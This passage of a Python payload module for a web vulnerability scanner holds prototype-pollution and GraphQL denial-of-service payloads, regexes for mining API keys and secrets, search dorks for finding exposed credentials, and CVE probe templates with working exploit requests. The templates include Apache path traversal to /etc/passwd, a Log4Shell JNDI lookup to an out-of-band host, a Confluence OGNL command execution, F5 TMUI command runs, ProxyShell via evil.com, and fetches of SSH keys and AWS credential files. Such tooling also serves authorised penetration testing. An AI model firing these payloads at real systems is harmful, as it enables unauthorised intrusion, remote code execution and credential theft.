    'X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Forwarded-Proto',
    'X-Original-Url', 'X-Rewrite-Url', 'X-Host',
    'X-Forwarded-Port', 'X-Forwarded-For', 'Forwarded',
    'X-Original-Host', 'X-Backend-Host',
    'X-Http-Method-Override', 'X-HTTP-Method',
    'X-Real-IP', 'True-Client-IP', 'CF-Connecting-IP',
]

# ============================================================================
# Prototype Pollution
# ============================================================================
PROTO_POLLUTION = {
    'query': [
        '__proto__[polluted]=true',
        '__proto__.polluted=true',
        'constructor.prototype.polluted=true',
        'constructor[prototype][polluted]=true',
    ],
    'json': [
        {'__proto__': {'polluted': True}},
        {'constructor': {'prototype': {'polluted': True}}},
        {'__proto__.polluted': True},
    ],
}

# ============================================================================
# GraphQL Attacks
# ============================================================================
GRAPHQL_PAYLOADS = {
    'introspection': [
        '{__schema{queryType{name} mutationType{name} subscriptionType{name} types{...FullType}} } fragment FullType on __Type { kind name description fields(includeDeprecated: true){ name description args{ ...InputValue } type{ ...TypeRef } isDeprecated deprecationReason } inputFields{ ...InputValue } interfaces{ ...TypeRef } enumValues(includeDeprecated: true){ name description isDeprecated deprecationReason } possibleTypes{ ...TypeRef } } fragment InputValue on __InputValue { name description type{...TypeRef} defaultValue } fragment TypeRef on __Type { kind name ofType{ kind name ofType{ kind name ofType{ kind name ofType{ kind name ofType{ kind name ofType{ kind name ofType{ kind name } } } } } } } }',
        '{__schema{types{name,fields{name,type{name}}}}}',
        'query IntrospectionQuery { __schema { queryType { name } } }',
    ],
    'introspection_bypass': [
        # Newline/comment inside __schema
        '{__schema\n{queryType{name}}}',
        '{__schema #foo\n{queryType{name}}}',
        # POST as GET
        # Force GET verb
    ],
    'field_suggestions': [
        '{aaaa}',  # returns "Did you mean..." leak
    ],
    'batching': [
        # DoS/BFLA
        '[{"query":"{__typename}"}, {"query":"{__typename}"}, {"query":"{__typename}"}]',
    ],
    'circular_query': [
        # Recursive query causing DoS
        'query { user { posts { author { posts { author { posts { title } } } } } } }',
    ],
}

# ============================================================================
# SECRETS - Regex patterns for JS/config file mining
# ============================================================================
SECRET_PATTERNS = {
    'aws_access_key': r'AKIA[0-9A-Z]{16}',
    'aws_secret_key': r'(?i)aws_secret[^\s\'"]*[\'"][0-9a-zA-Z/+]{40}[\'"]',
    'aws_session_token': r'(?i)aws_session_token[^\s\'"]*[\'"][A-Za-z0-9+/=]{100,}[\'"]',
    'gcp_service_account': r'"type":\s*"service_account"',
    'gcp_api_key': r'AIza[0-9A-Za-z\-_]{35}',
    'azure_storage_key': r'AccountKey=[A-Za-z0-9+/=]{88}',
    'github_token': r'gh[pousr]_[A-Za-z0-9_]{36,251}',
    'github_pat': r'github_pat_[A-Za-z0-9_]{82}',
    'gitlab_token': r'glpat-[A-Za-z0-9_\-]{20}',
    'slack_token': r'xox[baprs]-[A-Za-z0-9\-]{10,72}',
    'slack_webhook': r'https://hooks\.slack\.com/services/[A-Z0-9]+/[A-Z0-9]+/[A-Za-z0-9]+',
    'discord_webhook': r'https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+',
    'telegram_bot': r'\d{9,10}:[A-Za-z0-9_-]{35}',
    'stripe_live': r'sk_live_[A-Za-z0-9]{24,}',
    'stripe_publishable': r'pk_live_[A-Za-z0-9]{24,}',
    'stripe_test': r'sk_test_[A-Za-z0-9]{24,}',
    'paypal_braintree': r'access_token\$production\$[a-z0-9]{16}\$[a-f0-9]{32}',
    'twilio_sid': r'AC[a-f0-9]{32}',
    'twilio_token': r'SK[a-f0-9]{32}',
    'sendgrid_key': r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',
    'mailgun_key': r'key-[a-f0-9]{32}',
    'mailchimp_key': r'[a-f0-9]{32}-us[0-9]{1,2}',
    'square_secret': r'sq0[a-z]+-[A-Za-z0-9_-]{22,43}',
    'firebase_key': r'AIza[0-9A-Za-z_-]{35}',
    'firebase_url': r'https?://[a-z0-9-]+\.firebaseio\.com',
    'private_key_rsa': r'-----BEGIN (RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY-----',
    'pem_certificate': r'-----BEGIN CERTIFICATE-----',
    'ssh_dsa': r'-----BEGIN DSA PRIVATE KEY-----',
    'jwt_token': r'ey[A-Za-z0-9_-]{10,}\.ey[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}',
    'basic_auth_url': r'https?://[A-Za-z0-9._~-]+:[A-Za-z0-9._~%!$&\'()*+,;=-]+@',
    'generic_api_key': r'(?i)(api[_-]?key|apikey|api_secret)[\s]*[:=][\s]*[\'"]([A-Za-z0-9_\-]{16,})[\'"]',
    'generic_secret': r'(?i)(secret|token|password|passwd|pwd)[\s]*[:=][\s]*[\'"]([A-Za-z0-9_\-!@#$%^&*]{8,})[\'"]',
    'mongo_uri': r'mongodb(?:\+srv)?://[^\s\'"]{10,}',
    'postgres_uri': r'postgres(?:ql)?://[^\s\'"]{10,}',
    'redis_uri': r'redis(?:s)?://[^\s\'"]{5,}',
    'mysql_uri': r'mysql://[^\s\'"]{5,}',
    'ipv4_private': r'\b(10\.\d+\.\d+\.\d+|172\.(1[6-9]|2\d|3[01])\.\d+\.\d+|192\.168\.\d+\.\d+)\b',
    'algolia_key': r'"?algolia[a-zA-Z_]*"?\s*[:=]\s*"?([a-f0-9]{32})"?',
    'cloudinary_url': r'cloudinary://\d+:[A-Za-z0-9_-]+@[A-Za-z0-9_-]+',
    'heroku_key': r'(?i)heroku[a-z_]*[\s:=]+[\'"]?([a-f0-9-]{36})[\'"]?',
    'dropbox_key': r'sl\.[A-Za-z0-9\-_]{130,}',
    'shopify_token': r'shp(at|pa|ss|ca)_[a-fA-F0-9]{32}',
    'npm_token': r'npm_[A-Za-z0-9]{36}',
    'pypi_token': r'pypi-[A-Za-z0-9\-_]{100,}',
    'docker_hub_pat': r'dckr_pat_[A-Za-z0-9\-_]{20,}',
    'openai_key': r'sk-[A-Za-z0-9]{20}T3BlbkFJ[A-Za-z0-9]{20}',
    'anthropic_key': r'sk-ant-api\d{2}-[A-Za-z0-9_\-]{95,}',
    'linear_key': r'lin_api_[A-Za-z0-9]{40}',
    'atlassian_token': r'ATATT3[A-Za-z0-9_=-]{100,}',
    'terraform_token': r'[A-Za-z0-9]{14}\.atlasv1\.[A-Za-z0-9_-]{60,}',
}

# ============================================================================
# CVE / VERSION-BASED CHECKS - Nuclei-lite templates
# Each: {id, name, cve, cvss, severity, matchers}
# ============================================================================
CVE_TEMPLATES = [
    {'id': 'apache-2.4.49-path-traversal', 'cve': 'CVE-2021-41773',
     'name': 'Apache HTTP Server 2.4.49 Path Traversal', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd',
     'match_status': [200], 'match_body': ['root:x:', 'root:!:']},
    {'id': 'apache-2.4.50-rce', 'cve': 'CVE-2021-42013',
     'name': 'Apache HTTP Server 2.4.50 RCE', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/etc/passwd',
     'match_status': [200], 'match_body': ['root:x:']},
    {'id': 'log4shell-probe', 'cve': 'CVE-2021-44228',
     'name': 'Log4j RCE (Log4Shell)', 'severity': 'critical', 'cvss': 10.0,
     'method': 'GET', 'path': '/', 'headers': {
         'User-Agent': '${jndi:ldap://{OOB}/x}',
         'X-Api-Version': '${jndi:ldap://{OOB}/x}',
         'Referer': '${jndi:ldap://{OOB}/x}',
     }, 'oob': True},
    {'id': 'spring4shell', 'cve': 'CVE-2022-22965',
     'name': 'Spring Framework RCE (Spring4Shell)', 'severity': 'critical', 'cvss': 9.8,
     'method': 'POST', 'path': '/?class.module.classLoader.resources.context.parent.pipeline.first.pattern=test',
     'match_status': [200]},
    {'id': 'confluence-ognl-cve-2022-26134', 'cve': 'CVE-2022-26134',
     'name': 'Atlassian Confluence OGNL Injection', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/%24%7B%28%23a%3D%40org.apache.commons.io.IOUtils%40toString%28%40java.lang.Runtime%40getRuntime%28%29.exec%28%22id%22%29.getInputStream%28%29%2C%22utf-8%22%29%29.%28%40com.opensymphony.webwork.ServletActionContext%40getResponse%28%29.setHeader%28%22X-Cmd-Response%22%2C%23a%29%29%7D/',
     'match_headers': ['X-Cmd-Response']},
    {'id': 'gitlab-cve-2021-22205', 'cve': 'CVE-2021-22205',
     'name': 'GitLab Unauthenticated RCE (ExifTool)', 'severity': 'critical', 'cvss': 10.0,
     'method': 'POST', 'path': '/uploads/user',
     'match_status': [401, 403], 'fingerprint': 'gitlab'},
    {'id': 'jenkins-cve-2024-23897', 'cve': 'CVE-2024-23897',
     'name': 'Jenkins Arbitrary File Read', 'severity': 'high', 'cvss': 8.8,
     'method': 'GET', 'path': '/manage', 'match_body': ['Jenkins'],
     'fingerprint': 'jenkins'},
    {'id': 'wp-config-exposed', 'cve': 'N/A',
     'name': 'WordPress wp-config.php exposed', 'severity': 'critical', 'cvss': 9.0,
     'method': 'GET', 'path': '/wp-config.php.bak',
     'match_status': [200], 'match_body': ['DB_PASSWORD', 'AUTH_KEY']},
    {'id': 'env-file-exposed', 'cve': 'N/A',
     'name': '.env file exposed', 'severity': 'critical', 'cvss': 9.0,
     'method': 'GET', 'path': '/.env',
     'match_status': [200], 'match_body': ['DB_', 'APP_KEY', 'SECRET']},
    {'id': 'git-config-exposed', 'cve': 'N/A',
     'name': '.git/config exposed', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/.git/config',
     'match_status': [200], 'match_body': ['[core]', 'repositoryformatversion']},
    {'id': 'git-head-exposed', 'cve': 'N/A',
     'name': '.git/HEAD exposed', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/.git/HEAD',
     'match_status': [200], 'match_body': ['ref: refs/']},
    {'id': 'svn-entries', 'cve': 'N/A',
     'name': '.svn/entries exposed', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/.svn/entries', 'match_status': [200]},
    {'id': 'phpinfo', 'cve': 'N/A',
     'name': 'phpinfo() page exposed', 'severity': 'medium', 'cvss': 5.3,
     'method': 'GET', 'path': '/phpinfo.php',
     'match_status': [200], 'match_body': ['PHP Version', 'phpinfo()']},
    {'id': 'server-status', 'cve': 'N/A',
     'name': 'Apache /server-status exposed', 'severity': 'medium', 'cvss': 5.3,
     'method': 'GET', 'path': '/server-status',
     'match_status': [200], 'match_body': ['Server Version', 'Apache']},
    {'id': 'actuator-env', 'cve': 'N/A',
     'name': 'Spring Boot Actuator /env exposed', 'severity': 'high', 'cvss': 8.6,
     'method': 'GET', 'path': '/actuator/env',
     'match_status': [200], 'match_body': ['propertySources']},
    {'id': 'actuator-heapdump', 'cve': 'N/A',
     'name': 'Spring Boot Actuator /heapdump exposed', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/actuator/heapdump',
     'match_status': [200], 'match_size_gt': 100000},
    {'id': 'swagger-exposed', 'cve': 'N/A',
     'name': 'Swagger UI exposed', 'severity': 'info', 'cvss': 0,
     'method': 'GET', 'paths': ['/swagger-ui.html', '/swagger-ui/', '/api/swagger-ui/',
                                '/v2/api-docs', '/v3/api-docs', '/api/docs', '/docs',
                                '/swagger/index.html', '/swagger.json', '/swagger.yaml'],
     'match_status': [200], 'match_body': ['swagger', 'openapi']},
    {'id': 'graphql-exposed', 'cve': 'N/A',
     'name': 'GraphQL endpoint exposed', 'severity': 'info', 'cvss': 0,
     'method': 'POST', 'paths': ['/graphql', '/api/graphql', '/v1/graphql', '/query'],
     'body': '{"query":"{__typename}"}',
     'match_body': ['data', '__typename']},
    {'id': 'ws-ssh', 'cve': 'N/A',
     'name': 'Websocket SSH shell exposed', 'severity': 'high', 'cvss': 8.0,
     'method': 'GET', 'path': '/'},
    {'id': 'k8s-api', 'cve': 'N/A',
     'name': 'Kubernetes API unauthenticated', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'paths': ['/api/v1/namespaces', '/api', '/version'],
     'match_body': ['kind', 'apiVersion']},
    {'id': 'k8s-dashboard', 'cve': 'N/A',
     'name': 'Kubernetes Dashboard exposed', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/#/login', 'match_body': ['Kubernetes Dashboard']},
    {'id': 'docker-api', 'cve': 'N/A',
     'name': 'Docker Remote API exposed', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'paths': ['/v1.40/info', '/v1.41/version', '/containers/json', '/info'],
     'match_body': ['ID', 'Containers']},
    {'id': 'consul-services', 'cve': 'N/A',
     'name': 'HashiCorp Consul services exposed', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/v1/catalog/services', 'match_status': [200]},
    {'id': 'etcd-keys', 'cve': 'N/A',
     'name': 'etcd v2 keys exposed', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/v2/keys', 'match_status': [200]},
    {'id': 'prometheus-metrics', 'cve': 'N/A',
     'name': 'Prometheus /metrics exposed', 'severity': 'low', 'cvss': 3.1,
     'method': 'GET', 'path': '/metrics',
     'match_body': ['# HELP', '# TYPE']},
    {'id': 'grafana-login', 'cve': 'CVE-2019-15043',
     'name': 'Grafana panel exposed', 'severity': 'medium', 'cvss': 6.5,
     'method': 'GET', 'path': '/login',
     'match_body': ['Grafana']},
    {'id': 'kibana', 'cve': 'N/A',
     'name': 'Kibana panel exposed', 'severity': 'medium', 'cvss': 6.5,
     'method': 'GET', 'path': '/app/kibana', 'match_body': ['kibana']},
    {'id': 'elasticsearch', 'cve': 'N/A',
     'name': 'Elasticsearch open', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/_cat/indices', 'match_status': [200]},
    {'id': 'jira-fe-anonymous', 'cve': 'CVE-2020-14181',
     'name': 'Jira User Enumeration (unauth)', 'severity': 'medium', 'cvss': 5.3,
     'method': 'GET', 'path': '/ViewUserHover.jspa?username=admin', 'match_body': ['UserHover']},
    {'id': 'wp-json-users', 'cve': 'N/A',
     'name': 'WordPress /wp-json/wp/v2/users exposed', 'severity': 'low', 'cvss': 3.1,
     'method': 'GET', 'path': '/wp-json/wp/v2/users',
     'match_body': ['slug', 'name']},
    {'id': 'wp-json-users-yoast', 'cve': 'N/A',
     'name': 'WordPress /?rest_route=/wp/v2/users', 'severity': 'low', 'cvss': 3.1,
     'method': 'GET', 'path': '/?rest_route=/wp/v2/users',
     'match_body': ['slug']},
    {'id': 'aws-credentials', 'cve': 'N/A',
     'name': 'AWS credentials file exposed', 'severity': 'critical', 'cvss': 10.0,
     'method': 'GET', 'paths': ['/.aws/credentials', '/aws.txt', '/credentials'],
     'match_body': ['aws_access_key_id', 'aws_secret_access_key']},
    {'id': 'ssh-key', 'cve': 'N/A',
     'name': 'SSH private key exposed', 'severity': 'critical', 'cvss': 10.0,
     'method': 'GET', 'paths': ['/id_rsa', '/.ssh/id_rsa', '/id_dsa', '/id_ecdsa', '/id_ed25519'],
     'match_body': ['BEGIN OPENSSH PRIVATE KEY', 'BEGIN RSA PRIVATE KEY']},
    {'id': 'backup-file', 'cve': 'N/A',
     'name': 'Backup file exposed', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'paths': ['/backup.zip', '/backup.tar.gz', '/backup.sql', '/db.sql',
                                '/dump.sql', '/database.sql', '/site.tar.gz', '/backup.rar',
                                '/www.zip', '/website.zip', '/wwwroot.zip']},
    {'id': 'directory-listing', 'cve': 'N/A',
     'name': 'Directory Listing enabled', 'severity': 'low', 'cvss': 3.1,
     'method': 'GET', 'path': '/',
     'match_body': ['Index of /', '<title>Index of']},
    {'id': 'nginx-ignition', 'cve': 'CVE-2021-23017',
     'name': 'Nginx DNS resolver off-by-one', 'severity': 'high', 'cvss': 8.1,
     'header_match': {'Server': 'nginx/1\\.(2[0-5]|1\\d)\\.'}},
    {'id': 'axios-ssrf', 'cve': 'CVE-2024-39338',
     'name': 'Axios SSRF < 1.7.4', 'severity': 'medium', 'cvss': 6.5,
     'fingerprint': 'axios'},
    {'id': 'fortinet-fortios', 'cve': 'CVE-2018-13379',
     'name': 'FortiOS Path Traversal', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession',
     'match_body': ['var fgt_lang']},
    {'id': 'citrix-adc-cve-2019-19781', 'cve': 'CVE-2019-19781',
     'name': 'Citrix ADC Path Traversal', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/vpn/../vpns/cfg/smb.conf', 'match_status': [200]},
    {'id': 'f5-tmui-cve-2020-5902', 'cve': 'CVE-2020-5902',
     'name': 'F5 BIG-IP TMUI RCE', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/tmui/login.jsp/..;/tmui/locallb/workspace/tmshCmd.jsp?command=list+auth+user+admin',
     'match_status': [200]},
    {'id': 'pulse-secure-cve-2019-11510', 'cve': 'CVE-2019-11510',
     'name': 'Pulse Secure Arbitrary File Read', 'severity': 'critical', 'cvss': 10.0,
     'method': 'GET', 'path': '/dana-na/../dana/html5acc/guacamole/../../../../../../etc/passwd?/dana/html5acc/guacamole/',
     'match_body': ['root:x:']},
    {'id': 'vmware-vcenter-cve-2021-21985', 'cve': 'CVE-2021-21985',
     'name': 'VMware vCenter RCE', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/ui/vropspluginui/rest/services/getstatus',
     'match_status': [200]},
    {'id': 'weblogic-cve-2020-14882', 'cve': 'CVE-2020-14882',
     'name': 'Oracle WebLogic Console Auth Bypass', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/console/css/%252e%252e%252fconsole.portal',
     'match_body': ['ConsoleHelpPortlet']},
    {'id': 'exchange-proxyshell', 'cve': 'CVE-2021-34473',
     'name': 'Microsoft Exchange ProxyShell', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'path': '/autodiscover/autodiscover.json?@evil.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@evil.com',
     'match_status': [200, 400]},
    {'id': 'movable-type-cve-2021-20837', 'cve': 'CVE-2021-20837',
     'name': 'Movable Type XMLRPC RCE', 'severity': 'critical', 'cvss': 9.8,
     'method': 'POST', 'path': '/cgi-bin/mt/mt-xmlrpc.cgi'},
    {'id': 'sonarqube-anon', 'cve': 'N/A',
     'name': 'SonarQube anonymous access', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/api/settings/values?keys=sonar.forceAuthentication',
     'match_body': ['"value":"false"']},
    {'id': 'rails-secret-yaml', 'cve': 'N/A',
     'name': 'Rails secrets.yml exposed', 'severity': 'critical', 'cvss': 9.8,
     'method': 'GET', 'paths': ['/config/secrets.yml', '/config/database.yml', '/config/master.key'],
     'match_body': ['secret_key_base', 'production:', 'development:']},
    {'id': 'laravel-log-viewer', 'cve': 'N/A',
     'name': 'Laravel Log Viewer exposed', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/log-viewer', 'match_body': ['Laravel Log Viewer']},
    {'id': 'laravel-debug', 'cve': 'N/A',
     'name': 'Laravel Debug Mode enabled', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/',
     'match_body': ['Whoops! There was an error', 'ignition']},
    {'id': 'nginx-alias-lfi', 'cve': 'N/A',
     'name': 'Nginx alias misconfig LFI', 'severity': 'high', 'cvss': 7.5,
     'method': 'GET', 'path': '/static../etc/passwd', 'match_body': ['root:x:']},
]

# ============================================================================
# Google/Bing/Shodan dorks for external intelligence
# ============================================================================
SEARCH_DORKS = {
    'exposed_files': [
        'site:{DOMAIN} ext:sql | ext:log | ext:conf | ext:env',
        'site:{DOMAIN} intitle:"index of"',
        'site:{DOMAIN} ext:xml | ext:json password',
        'site:{DOMAIN} inurl:backup',
        'site:{DOMAIN} inurl:admin',
        'site:{DOMAIN} inurl:phpmyadmin',
        'site:{DOMAIN} inurl:wp-admin',
        'site:{DOMAIN} ext:git | inurl:.git',
    ],
    'sensitive_endpoints': [
        'site:{DOMAIN} inurl:api',
        'site:{DOMAIN} inurl:v1 | inurl:v2 | inurl:v3',
        'site:{DOMAIN} inurl:swagger',
        'site:{DOMAIN} inurl:graphql',
        'site:{DOMAIN} inurl:actuator',
        'site:{DOMAIN} inurl:jenkins',
    ],
    'github_dorks': [
        '"{DOMAIN}" password',
        '"{DOMAIN}" secret',
        '"{DOMAIN}" api_key',
        '"{DOMAIN}" AWS_SECRET',
        '"{DOMAIN}" filename:.env',
        '"{DOMAIN}" filename:config',
        '"{DOMAIN}" DB_PASSWORD',
        'org:{ORG} filename:.env',
    ],
    'shodan_dorks': [
        'hostname:{DOMAIN}',
        'ssl:"{DOMAIN}"',
        'org:"{ORG}"',
        'http.favicon.hash:{FAVHASH}',
    ],
}


# ============================================================================
# Unified access object
# ============================================================================
class PayloadRegistry:
    xss = XSS_PAYLOADS
    sqli = SQLI_PAYLOADS
    nosqli = NOSQLI_PAYLOADS
    cmd = CMD_INJECTION_PAYLOADS
    ssti = SSTI_PAYLOADS
    lfi = LFI_PAYLOADS
    xxe = XXE_PAYLOADS
    ssrf = SSRF_PAYLOADS
    open_redirect = OPEN_REDIRECT_PAYLOADS
    cors = CORS_ORIGINS_TO_TEST
    crlf = CRLF_PAYLOADS
    jwt = JWT_ATTACKS
    smuggling = SMUGGLING_PAYLOADS
    cache = CACHE_POISON_HEADERS
    proto = PROTO_POLLUTION
    graphql = GRAPHQL_PAYLOADS
    secrets = SECRET_PATTERNS
    cve = CVE_TEMPLATES
    dorks = SEARCH_DORKS


PAYLOADS = PayloadRegistry()

# Merge v7 extension pack (800+ additional payloads and new categories)
try:
    from .payloads_extra import merge_into_registry as _merge_extra
    _merge_extra(PAYLOADS)
except Exception:
    pass


def count_payloads():
    """Return counts per category."""
    counts = {}

    def _count(x):
        if isinstance(x, list):
            return len(x)
        if isinstance(x, dict):
            return sum(_count(v) for v in x.values())
        return 1

    counts['xss'] = _count(XSS_PAYLOADS)
    counts['sqli'] = _count(SQLI_PAYLOADS)
    counts['nosqli'] = _count(NOSQLI_PAYLOADS)
    counts['cmd_injection'] = _count(CMD_INJECTION_PAYLOADS)
    counts['ssti'] = _count(SSTI_PAYLOADS)
    counts['lfi'] = _count(LFI_PAYLOADS)
    counts['xxe'] = _count(XXE_PAYLOADS)
    counts['ssrf'] = _count(SSRF_PAYLOADS)
    counts['open_redirect'] = _count(OPEN_REDIRECT_PAYLOADS)
    counts['cors'] = _count(CORS_ORIGINS_TO_TEST)
    counts['crlf'] = _count(CRLF_PAYLOADS)
    counts['jwt'] = _count(JWT_ATTACKS)
    counts['smuggling'] = _count(SMUGGLING_PAYLOADS)
    counts['cache_poison'] = _count(CACHE_POISON_HEADERS)
    counts['proto_pollution'] = _count(PROTO_POLLUTION)
    counts['graphql'] = _count(GRAPHQL_PAYLOADS)
    counts['secrets_regex'] = len(SECRET_PATTERNS)
    counts['cve_templates'] = len(CVE_TEMPLATES)
    counts['dorks'] = _count(SEARCH_DORKS)
    counts['TOTAL'] = sum(v for k, v in counts.items() if k != 'TOTAL')
    return counts
